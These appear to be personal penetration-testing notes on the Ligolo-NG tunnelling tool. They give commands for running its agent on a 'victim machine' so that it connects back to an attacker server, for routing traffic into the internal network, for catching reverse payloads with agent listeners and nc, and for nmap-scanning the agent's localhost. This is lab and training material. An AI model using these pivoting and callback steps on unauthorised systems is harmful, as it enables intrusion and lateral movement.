https://github.com/nicocha30/ligolo-ng

much faster than a socks proxy

transfer the Ligolo-NG agent to the victim machine first

```bash
## Setting up tun interface on server (kali) & start
sudo ip tuntap add user [your_username] mode tun ligolo
sudo ip link set ligolo up
ligolo-ng -selfcert

## Now on client
.\ligolo-ng-agent -connect 192.168.45.222:11601 -ignore-cert

## Back on server. Should say agent has joined
session

## whatever session the agent joined as (should be 1 unless doing multiple)
session 1

## display the network config of the agent
ifconfig

## start new shell (or background ligolo with ctrl+z) and add the route to the target network (displayed in ifconfig)
sudo ip route add 192.168.0.0/24 dev ligolo

## now start the tunnel on the proxy
start
```

###  Agent Binding/Listening

You can listen to ports on the _agent_ and _redirect_ connections to your control/proxy server.

In a ligolo session, use the `listener_add` command.

The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server.
```
[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
INFO[1208] Listener created on remote agent!            
```

On the `proxy`:
```bash
 nc -lvp 4321
```

When a connection is made on the TCP port `1234` of the agent, `nc` will receive the connection.

This is very useful when using reverse tcp/udp payloads.

You can view currently running listeners using the `listener_list` command and stop them using the `listener_stop [ID]` command:
```
[Agent : nchatelain@nworkstation] » listener_list 
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ nchatelain@nworkstation │ 0.0.0.0:1234           │ 127.0.0.1:4321         │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘

[Agent : nchatelain@nworkstation] » listener_stop 0
INFO[1505] Listener closed.                             
```

### Access to agent's local ports (127.0.0.1)

If you need to access the local ports of the currently connected agent, there's a "magic" IP hardcoded in Ligolo-ng: _240.0.0.1_ ( This IP address is part of an unused IPv4 subnet). If you query this IP address, Ligolo-ng will automatically redirect traffic to the agent's local IP address (127.0.0.1).

Example:
```
$ sudo ip route add 240.0.0.1/32 dev ligolo
$ nmap 240.0.0.1 -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-30 22:17 CET
Nmap scan report for 240.0.0.1
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
8000/tcp open http SimpleHTTPServer 0.6 (Python 3.9.2)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds
```